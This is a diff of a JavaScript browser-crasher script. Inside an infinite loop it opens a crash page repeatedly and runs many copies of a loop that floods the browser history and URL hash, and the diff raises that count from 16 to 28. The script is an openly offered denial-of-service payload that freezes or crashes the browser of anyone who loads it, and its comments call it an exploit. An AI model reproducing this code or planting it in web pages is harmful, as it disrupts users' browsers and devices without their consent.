@@ -26,22 +26,34 @@ while(1) {
    window.open("https://the-imortal-crasher.github.io/chrome-crash/"); window.open("https://the-imortal-crasher.github.io/chrome-crash/");
  
    // For Script That Will Cause Imidiate Lag. (This Does Not Force A Popup Blocker) And Guess What, Its Also The Exploit We Fixed.
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
-   for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
+   for(a="#",i=0;i != i+100000000;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
    // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
  
 } 
